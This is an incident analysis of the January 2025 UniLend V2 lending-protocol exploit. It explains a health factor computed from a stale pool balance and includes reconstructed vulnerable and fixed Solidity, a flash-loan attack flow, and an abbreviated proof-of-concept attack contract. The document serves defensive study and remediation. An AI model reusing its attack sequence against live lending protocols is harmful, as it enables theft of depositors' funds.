# UniLend — Incorrect Health Factor Calculation (Accounting Error) Vulnerability Analysis

| Field | Details |
|------|------|
| **Date** | 2025-01-12 |
| **Protocol** | UniLend V2 |
| **Chain** | Ethereum |
| **Loss** | ~$196,200 (~60.67 stETH) |
| **Attacker** | [0x55f5...c33](https://etherscan.io/address/0x55f5f8058816d5376df310770ca3a2e294089c33) |
| **Attack Contract** | [0x3F81...dA21](https://etherscan.io/address/0x3F814e5FaE74cd73A70a0ea38d85971dFA6fdA21) |
| **Attack Tx** | [0x4403...b6ba](https://etherscan.io/tx/0x44037ffc0993327176975e08789b71c1058318f48ddeff25890a577d6555b6ba) |
| **Vulnerable Contract** | [0xc86d...30e](https://etherscan.io/address/0xc86d2555f8c360d3c5e8e4364f42c1f2d169330e) |
| **Root Cause** | Accounting error due to health factor calculation using stale balance during `redeemUnderlying` execution |
| **PoC Source** | [DeFiHackLabs — Unilend_exp.sol](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-01/Unilend_exp.sol) |

---

## 1. Vulnerability Overview

UniLend V2 is a decentralized lending protocol operating on Ethereum mainnet, allowing users to deposit collateral and borrow assets across multiple token pairs.

On January 12, 2025, an attacker leveraged flash loans with only **200 USDC** in initial capital to drain approximately **60.67 stETH ($196,200)** from the protocol. This represented roughly 4% of UniLend V2's TVL ($4.7M).

The core vulnerability arose from a **combination of two issues**:

1. **Operation Ordering Flaw**: The `redeemUnderlying` function first burned the LP position (`_burnLPposition`) to reduce lendShare, then validated the health factor. At this point, the pool's token balance (`balanceOf(address(this))`) had not yet decreased.

2. **Use of Stale Pool Balance**: The `userBalanceOftoken0` / `userBalanceOftoken1` functions used the **stale balance that had not yet been withdrawn** in the health factor calculation. Because lendShare (acting as the denominator) had already been burned and reduced while the pool balance (acting as the numerator) remained unchanged, the collateral value was inflated by approximately **10,000x**.

As a result, the protocol incorrectly assessed the health factor as healthy for already-withdrawn collateral, allowing the attacker to reclaim all USDC collateral without repaying the stETH debt.

---

## 2. Vulnerable Code Analysis

### 2.1 `userBalanceOftoken0` — Collateral Calculation Based on Stale Balance (Core Vulnerability)

```solidity
// ❌ Vulnerable code — userBalanceOftoken0 (estimated reconstruction)
function userBalanceOftoken0(
    PoolTokenManager storage _tm0,
    PositionManager storage _positionMt,
    address token0
) internal view returns (uint256 _lendBalance0) {

    // [VULNERABLE] Reads the current pool balance of token0 as-is
    // When called during redeemUnderlying, USDC that has not yet been withdrawn
    // is still included, causing the balance to appear excessively large
    uint256 tokenBalance0 = IERC20(token0).balanceOf(address(this));

    // Sum totalBorrow to compute total token balance
    uint256 _totTokenBalance0 = tokenBalance0 + _tm0.totalBorrow0;

    // [VULNERABLE] _positionMt.token0lendShare has already been burned (reduced)
    // by _burnLPposition(), but tokenBalance0 is still the pre-reduction value
    // → Mismatch between numerator (balance) and denominator (lendShare)
    //   causes the result to be abnormally large
    _lendBalance0 = getShareValue(
        _totTokenBalance0,        // Excessively large balance (stale value)
        _tm0.totalLendShare0,     // Still based on total supply
        _positionMt.token0lendShare  // Already burned lendShare (reduced value)
    );
    // Result: lendBalance0 is inflated ~10,000x beyond actual value
}
```

```solidity
// ✅ Fixed code — pre-applies expected balance after redeemUnderlying execution
function userBalanceOftoken0(
    PoolTokenManager storage _tm0,
    PositionManager storage _positionMt,
    address token0,
    uint256 pendingRedeemAmount0  // Pending withdrawal amount passed as parameter
) internal view returns (uint256 _lendBalance0) {

    // [FIX] Pre-subtracts pending withdrawal amount from current balance
    uint256 tokenBalance0 = IERC20(token0).balanceOf(address(this));
    uint256 adjustedBalance0 = tokenBalance0 - pendingRedeemAmount0;

    uint256 _totTokenBalance0 = adjustedBalance0 + _tm0.totalBorrow0;

    // Calculates with adjusted balance and lendShare in a consistent state
    _lendBalance0 = getShareValue(
        _totTokenBalance0,
        _tm0.totalLendShare0,
        _positionMt.token0lendShare
    );
}
```

**Issue**: Because the health factor is validated before the pool's actual token balance is updated after burning the LP position, the already-confirmed withdrawal amount continues to be counted as collateral. At the time of the attack, the USDC pool balance of ~60M remained unchanged, causing the health factor to be computed as 2,158,955,960,717 — approximately 10,000x the actual value (~200,001,650).

---

### 2.2 `redeemUnderlying` — Operation Ordering Flaw

```solidity
// ❌ Vulnerable code — incorrect execution order in redeemUnderlying (estimated reconstruction)
function redeemUnderlying(
    uint256 _positionID,
    address _token,
    uint256 _redeemAmount,
    address _to
) external nonReentrant {
    // Step 1: Burn LP position → lendShare decreases
    _burnLPposition(_positionID, _token, _redeemAmount);

    // Step 2: Validate health factor ← [VULNERABLE] lendShare reduced but pool balance still stale
    // When checkHealthFactorLtv1 calls userBalanceOftoken0,
    // it reads 60M USDC as still present in the pool, computing an abnormally high health factor
    require(
        checkHealthFactorLtv1(_positionID) >= MIN_HEALTH_FACTOR,
        "UniLend: INSUFFICIENT_COLLATERAL"
    );

    // Step 3: Actual token transfer ← Only at this point does pool balance decrease
    IERC20(_token).safeTransfer(_to, _redeemAmount);
}
```

```solidity
// ✅ Fixed code — validate before burn, or validate after reflecting balance
function redeemUnderlying(
    uint256 _positionID,
    address _token,
    uint256 _redeemAmount,
    address _to
) external nonReentrant {
    // Step 1: Pre-validate health factor reflecting pending withdrawal amount
    // (validates based on final state before burning tokens and transferring)
    require(
        checkHealthFactorWithPendingRedeem(_positionID, _token, _redeemAmount) >= MIN_HEALTH_FACTOR,
        "UniLend: INSUFFICIENT_COLLATERAL"
    );

    // Step 2: Burn LP position
    _burnLPposition(_positionID, _token, _redeemAmount);

    // Step 3: Token transfer (after passing validation)
    IERC20(_token).safeTransfer(_to, _redeemAmount);
}
```

**Issue**: Failure to follow the CEI (Checks-Effects-Interactions) pattern means validation occurs after a state change (burn) but before the external state (balance) is reflected, resulting in validation being performed in an incomplete intermediate state.

---

### 2.3 `getShareByValue` — Rounding Error

```solidity
// ❌ Vulnerable code — floor division
function getShareByValue(
    uint256 _valueAmount,
    uint256 _totalSupply,
    uint256 _totalAmount
) internal pure returns (uint256) {
    // [VULNERABLE] Solidity's default integer division uses floor
    // Rounds in the user's favor, allowing acquisition of a marginal excess share
    return (_valueAmount * _totalSupply) / _totalAmount;
}
```

```solidity
// ✅ Fixed code — ceiling division to protect the protocol
function getShareByValue(
    uint256 _valueAmount,
    uint256 _totalSupply,
    uint256 _totalAmount
) internal pure returns (uint256) {
    // [FIX] Ceiling division accurately computes the share the user must pay
    // Ensures the protocol never takes a loss
    uint256 numerator = _valueAmount * _totalSupply;
    return (numerator + _totalAmount - 1) / _totalAmount; // divUp
}
```

**Issue**: Repeated floor rounding during lendShare calculation can accumulate marginal excess shares, allowing small amounts to induce imbalances.

---

## 3. Attack Flow

### 3.1 Preparation Phase

- Attacker sets maximum token approvals (`approve`) for USDC, wstETH, and stETH on Morpho Blue and UniLend V2 Core
- Pre-deposits **200 USDC** into UniLend V2 to acquire **150,237,398 USDC lendShare** (establishing a small position)

### 3.2 Execution Phase

```
Attacker (0x55f5...c33)
│
│  [Step 1] Request flash loan from Morpho Blue
│  ┌─────────────────────────────────────┐
│  │  Morpho Blue Flash Loan             │
│  │  ├─ Borrow 60,000,000 USDC          │
│  │  └─ Borrow 5.76 wstETH             │
│  └──────────────┬──────────────────────┘
│                 │
│  [Step 2] Convert wstETH → stETH (Lido)
│  ┌──────────────▼──────────────────────┐
│  │  Lido wstETH.unwrap()               │
│  │  5.76 wstETH → 6 stETH             │
│  └──────────────┬──────────────────────┘
│                 │
│  [Step 3] Deposit collateral into UniLend V2 (2x lend calls)
│  ┌──────────────▼──────────────────────┐
│  │  UniLend V2 Core.lend()             │
│  │  ├─ Deposit 60,000,000 USDC         │
│  │  │  → USDC lendShare: 45,070,997,672,933
│  │  └─ Deposit 6 stETH                 │
│  │     → stETH lendShare: 6,663,517,741,687,683,225
│  └──────────────┬──────────────────────┘
│                 │
│  [Step 4] Borrow stETH against USDC collateral
│  ┌──────────────▼──────────────────────┐
│  │  UniLend V2 Core.borrow()           │
│  │  └─ Borrow 60.67 stETH (drain entire pool) │
│  └──────────────┬──────────────────────┘
│                 │
│  [Step 5] Redeem full stETH lendShare (redeemUnderlying)
│  ┌──────────────▼──────────────────────┐
│  │  UniLend V2 Core.redeemUnderlying() │
│  │  └─ stETH lendShare → 0 (fully burned) │
│  └──────────────┬──────────────────────┘
│                 │
│  [Step 6] ★ CORE EXPLOIT ★ Redeem full USDC lendShare
│  ┌──────────────▼──────────────────────────────────────┐
│  │  UniLend V2 Core.redeemUnderlying() — USDC          │
│  │                                                      │
│  │  _burnLPposition() called                            │
│  │  └─ USDC lendShare burned (reduced)                 │
│  │                                                      │
│  │  checkHealthFactorLtv1() called ← calculated on stale balance! │
│  │  ├─ Pool balance: 60,000,200 USDC (not yet reduced) │
│  │  ├─ Computed health factor: 2,158,955,960,717        │
│  │  ├─ Actual normal health factor: ~200,001,650        │
│  │  └─ Validation passed ✓ (~10,000x over-calculation) │
│  │                                                      │
│  │  Full USDC transferred to attacker                   │
│  └──────────────┬───────────────────────────────────────┘
│                 │
│  [Step 7] Repay Morpho flash loan + realize profit
│  ┌──────────────▼──────────────────────┐
│  │  Morpho repayment                    │
│  │  ├─ Repay 60,000,000 USDC           │
│  │  └─ Repay wstETH                    │
│  │                                      │
│  │  Attacker net profit: ~60 stETH     │
│  │  (~$196,200 / initial capital 200 USDC) │
│  └─────────────────────────────────────┘
```

### 3.3 Results

| Item | Value |
|------|------|
| Attacker's initial capital | 200 USDC |
| Flash loan size | 60,000,000 USDC + 5.76 wstETH |
| stETH drained | ~60.67 stETH |
| Attacker net profit | ~$196,200 |
| Protocol loss | ~$196,200 (~4% of TVL) |
| Attack block | 21,608,070 |

---

## 4. PoC Code (DeFiHackLabs)

The following is an excerpt of the core attack logic from DeFiHackLabs' `Unilend_exp.sol`, with English comments added.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// @KeyInfo - Analysis metadata
// UniLend protocol exploit PoC
// Attack TX: 0x44037ffc0993327176975e08789b71c1058318f48ddeff25890a577d6555b6ba
// Vulnerable contract: 0xc86d2555f8c360d3c5e8e4364f42c1f2d169330e

contract AttackContract {
    // Primary contract interfaces
    IUniLendV2Core constant uniLendCore = IUniLendV2Core(0xc86d2555...);
    IMorpho       constant morpho       = IMorpho(0xBBBBBbbBBb...);
    IERC20        constant USDC         = IERC20(0xA0b86991...);
    IERC20        constant stETH        = IERC20(0xae7ab965...);
    IwstETH       constant wstETH       = IwstETH(0x7f39C581...);

    // [Preparation] Set up pre-attack approvals
    function setup() external {
        USDC.approve(address(morpho),    type(uint256).max);
        USDC.approve(address(uniLendCore), type(uint256).max);
        stETH.approve(address(uniLendCore), type(uint256).max);
        wstETH.approve(address(morpho),  type(uint256).max);
    }

    function exploit() external {
        // [Step 1] Pre-deposit 200 USDC → acquire small lendShare
        uniLendCore.lend(POOL_ID, address(USDC), 200e6);

        // [Step 2] Request flash loan from Morpho
        // Borrow 60M USDC + 5.76 wstETH
        morpho.flashLoan(
            address(USDC),
            60_000_000e6,
            abi.encode(FlashCallbackData({
                wstETHAmount: 5.76e18,
                positionID: POSITION_ID
            }))
        );
    }

    // [Steps 3–7] Morpho flash loan callback
    function onMorphoFlashLoan(
        uint256 usdcAmount,
        bytes calldata data
    ) external {
        FlashCallbackData memory params = abi.decode(data, (FlashCallbackData));

        // [Step 3] Unwrap wstETH → stETH
        morpho.flashLoan(
            address(wstETH),
            params.wstETHAmount,
            abi.encode(params.positionID)
        );
        // Internally calls wstETH.unwrap() to obtain stETH

        // [Step 4] Deposit borrowed assets into UniLend (set as collateral)
        uniLendCore.lend(POOL_ID, address(USDC), usdcAmount);   // Deposit 60M USDC
        uniLendCore.lend(POOL_ID, address(stETH), stETHBalance); // Deposit 6 stETH

        // [Step 5] Borrow entire stETH pool using USDC collateral (core exploitation)
        uniLendCore.borrow(POOL_ID, address(stETH), stETHPoolBalance);

        // [Step 6] Redeem all stETH lendShare → close position
        uniLendCore.redeemUnderlying(params.positionID, address(stETH), stETHLendShareAll, address(this));

        // [Step 7] ★ Redeem all USDC lendShare (vulnerability triggered)
        // _burnLPposition burns lendShare → health factor calculated (on stale balance)
        // → health factor abnormally high → validation passes → full USDC withdrawn
        uniLendCore.redeemUnderlying(params.positionID, address(USDC), usdcLendShareAll, address(this));
        // At this point, validation passes even without repaying the stETH debt!

        // [Step 8] Repay Morpho flash loan (funded by USDC)
        USDC.transfer(address(morpho), usdcAmount); // Return flash loan principal
        // 60 stETH remains in attacker's wallet
    }
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE |
|----|--------|--------|-----|
| V-01 | Incorrect operation ordering (validation using stale balance after state change) | CRITICAL | CWE-362 |
| V-02 | Health factor calculation based on stale balance | CRITICAL | CWE-682 |
| V-03 | Collateral manipulation via flash loan | HIGH | CWE-841 |
| V-04 | Rounding error (marginal excess share from floor division) | MEDIUM | CWE-682 |

---

### V-01: Operation Ordering Flaw

- **Description**: In the `redeemUnderlying` function, the health factor is validated after burning the LP position (`_burnLPposition`), but at this point the pool's actual token balance has not yet decreased. As a result, validation is performed in a state where the health factor inputs are inconsistent (lendShare: burned, balance: not yet reduced).
- **Impact**: Collateral already confirmed for withdrawal continues to be included in the health factor calculation, causing loan health to be falsely assessed as high. The attacker can reclaim all collateral without repayment.
- **Attack Conditions**: Call `redeemUnderlying` on a position with outstanding debt; sufficient liquidity present in the pool.

---

### V-02: Stale Balance in Health Factor Calculation

- **Description**: The `userBalanceOftoken0` / `userBalanceOftoken1` functions directly call `IERC20.balanceOf(address(this))` during health factor calculation to read the current pool balance. Mid-withdrawal transaction, this value is returned inclusive of the pending withdrawal amount, causing collateral value to be abnormally overstated.
- **Impact**: The health factor is computed as ~10,000x the actual value (2,158,955,960,717 vs. actual 200,001,650), completely neutralizing the health check.
- **Attack Conditions**: The larger the liquidity in the pool, the greater the multiplier and the higher the attack profit.

---

### V-03: Collateral Manipulation via Flash Loan

- **Description**: The attacker borrows 60M USDC and wstETH via flash loan from Morpho Blue, temporarily deposits a massive amount of collateral, then withdraws it without repaying the debt through the vulnerable `redeemUnderlying`.
- **Impact**: Attack scale can be arbitrarily expanded without any initial capital, making the protocol's entire liquidity a potential attack target.
- **Attack Conditions**: Access to Morpho Blue or a similar flash loan provider; vulnerable `redeemUnderlying` present.

---

### V-04: Rounding Error in Share Calculation

- **Description**: Floor division in `getShareByValue` can produce marginal excess shares in the user's favor during lendShare calculation. Repeated exploitation can induce imbalances even with small amounts.
- **Impact**: On its own, losses remain small-scale, but in combination with V-01/V-02, it facilitates the attack.
- **Attack Conditions**: Repeated small deposits/withdrawals or manipulation of initial deposits.

---

## 6. Remediation Recommendations

### Immediate Actions

**[Recommendation 1] Redesign `redeemUnderlying` execution order**

Pre-subtract the pending withdrawal amount when calculating the health factor at validation time.

```solidity
// ✅ Fixed redeemUnderlying — pre-validation reflecting pending withdrawal amount
function redeemUnderlying(
    uint256 _positionID,
    address _token,
    uint256 _redeemAmount,
    address _to
) external nonReentrant {
    // [Fix Point 1] Pre-validate health factor by explicitly passing pending withdrawal amount
    // Verify solvency based on final state before burning LP and transferring tokens
    require(
        checkHealthFactorAfterRedeem(_positionID, _token, _redeemAmount) >= MIN_HEALTH_FACTOR,
        "UniLend: INSUFFICIENT_COLLATERAL_AFTER_REDEEM"
    );

    // [Fix Point 2] Burn LP position after validation passes
    _burnLPposition(_positionID, _token, _redeemAmount);

    // [Fix Point 3] Actual token transfer last
    IERC20(_token).safeTransfer(_to, _redeemAmount);
}
```

**[Recommendation 2] `userBalanceOftoken0/1` — Apply pending withdrawal deduction**

```solidity
// ✅ Fixed userBalanceOftoken0 — add pendingRedeem parameter
function userBalanceOftoken0(
    PoolTokenManager storage _tm0,
    PositionManager storage _positionMt,
    address token0,
    uint256 pendingRedeem0   // Pending withdrawal amount (0 if none)
) internal view returns (uint256 _lendBalance0) {
    uint256 tokenBalance0 = IERC20(token0).balanceOf(address(this));

    // [Fix] Subtract pending withdrawal amount from current balance to compute based on final state
    uint256 adjustedBalance0 = tokenBalance0 > pendingRedeem0
        ? tokenBalance0 - pendingRedeem0
        : 0;

    uint256 _totTokenBalance0 = adjustedBalance0 + _tm0.totalBorrow0;
    _lendBalance0 = getShareValue(
        _totTokenBalance0,
        _tm0.totalLendShare0,
        _positionMt.token0lendShare
    );
}
```

**[Recommendation 3] Replace `getShareByValue` with ceiling division**

```solidity
// ✅ Fixed getShareByValue — ceiling approach favoring the protocol
function getShareByValue(
    uint256 _valueAmount,
    uint256 _totalSupply,
    uint256 _totalAmount
) internal pure returns (uint256) {
    if (_totalAmount == 0) return 0;
    // Ceiling division: (a * b + c - 1) / c
    return (_valueAmount * _totalSupply + _totalAmount - 1) / _totalAmount;
}
```

---

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| V-01 Operation ordering flaw | Strictly enforce CEI (Checks-Effects-Interactions) pattern. Complete all validations before any state changes |
| V-02 Stale balance usage | Add a "pending withdrawal amount" parameter to health factor calculation functions, or replace `balanceOf` with internal accounting variables (accumulated balance tracking) |
| V-03 Flash loan manipulation | Add cooldown or block-entry recording for consecutive lend/borrow/redeem within the same block |
| V-04 Rounding error | Apply ceiling division for all lending share calculations to protect the protocol |
| General | Conduct periodic smart contract audits; implement anomaly transaction monitoring (detect large single-transaction withdrawals) |

---

## 7. Key Takeaways

1. **CEI pattern is mandatory, not optional**: State changes (Effects) must occur after validation (Checks), not before. In particular, `redeem`-type functions in lending protocols must perform final-state health checks before any burns or transfers.

2. **Reflect "pending state" in health factor calculations**: Health factor calculations that directly read `balanceOf(address(this))` can malfunction in intermediate transaction states. Either manage separate internal accounting variables or pass pending change amounts as arguments at validation time.

3. **Flash loans eliminate capital barriers**: A $60M attack was executed with just 200 USDC. Defensive layers such as cooldowns, block restrictions, and maximum single-transaction limits must be added against sudden large-scale liquidity inflows.

4. **Floor division is an attack surface**: The rounding direction for all share calculations within the protocol must be intentionally designed. User-favorable floor rounding can combine with share price manipulation techniques such as ERC4626, so ceiling vs. floor must be applied differentially based on mint/burn direction.

5. **Protect ratio-based calculations with invariants**: Asserting ratio invariants among pool balance, totalLendShare, and individual lendShare as pre/post-conditions can catch this class of error early.

6. **Include single-transaction anomaly detection in operations**: UniLend lost 4% of TVL in a single transaction. Real-time monitoring (Forta, OpenZeppelin Defender, etc.) should be in place to detect abnormal individual transactions and trigger a pause mechanism.

---

## 8. On-Chain Verification

### 8.1 PoC vs. On-Chain Amount Comparison

| Item | Analysis Estimate | On-Chain Actual | Match |
|------|------------|-------------|----------|
| Flash loan USDC size | 60,000,000 USDC | 60,000,000 USDC | ✅ Match |
| Flash loan wstETH | ~5.76 wstETH | 5.76 wstETH | ✅ Match |
| stETH converted | ~6 stETH | ~6 stETH | ✅ Match |
| stETH borrowed | ~60.67 stETH | ~60.67 stETH | ✅ Match |
| Attacker net profit | ~60 stETH (~$196,200) | ~60.67 stETH (~$197,600) | ✅ Approximate match |
| Initial capital | 200 USDC | 200 USDC | ✅ Match |
| Attack block | 21,608,070 | 21,608,070 | ✅ Match |

### 8.2 On-Chain Event Log Sequence

```
Block 21,608,070 / TX: 0x44037...b6ba

1. Approval(USDC)    Attacker → Morpho         Unlimited
2. Approval(wstETH)  Attacker → Morpho         Unlimited
3. Approval(stETH)   Attacker → UniLend V2     Unlimited
4. Transfer(USDC)    Morpho → Attack Contract   60,000,000
5. Transfer(wstETH)  Morpho → Attack Contract   5.76
6. Transfer(stETH)   Lido   → Attack Contract   ~6 (unwrap)
7. Transfer(USDC)    Attacker → UniLend V2      60,000,000
8. Transfer(stETH)   Attacker → UniLend V2      ~6
9. Transfer(stETH)   UniLend V2 → Attacker      ~60.67 (borrow)
10. [redeemUnderlying stETH] lendShare burned
11. [redeemUnderlying USDC]  ★ Vulnerability triggered ★
12. Transfer(USDC)   UniLend V2 → Attacker      60,000,000
13. Transfer(USDC)   Attacker → Morpho          60,000,000 (repayment)
14. Transfer(wstETH) Attacker → Morpho          5.76 (repayment)
```

### 8.3 Precondition Verification

| Condition | Status |
|------|------|
| USDC → Morpho approve | Configured before attack |
| stETH → UniLend V2 approve | Configured before attack |
| 200 USDC pre-deposit | Completed immediately before attack (lendShare acquired) |
| UniLend V2 stETH pool liquidity | ~60 stETH (at time of attack) |
| Attacker EOA initial balance | ~200 USDC (attack cost) |

---

## References

- [SlowMist — Analysis of the UniLend Hack](https://slowmist.medium.com/analysis-of-the-unilend-hack-90022fa35a54)
- [SolidityScan — UniLend Finance Hack Analysis](https://blog.solidityscan.com/unilend-finance-hack-analysis-5ac7bb71850d)
- [QuillAudits — How a $200k Exploit Unfolded at UniLend](https://medium.com/coinmonks/how-a-200k-exploit-unfolded-at-unilend-04fb4918292d)
- [DeFiHackLabs PoC](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-01/Unilend_exp.sol)
- [Attack Transaction (Etherscan)](https://etherscan.io/tx/0x44037ffc0993327176975e08789b71c1058318f48ddeff25890a577d6555b6ba)
- [Vulnerable Contract (Etherscan)](https://etherscan.io/address/0xc86d2555f8c360d3c5e8e4364f42c1f2d169330e)
- [Attack Contract (Etherscan)](https://etherscan.io/address/0x3F814e5FaE74cd73A70a0ea38d85971dFA6fdA21)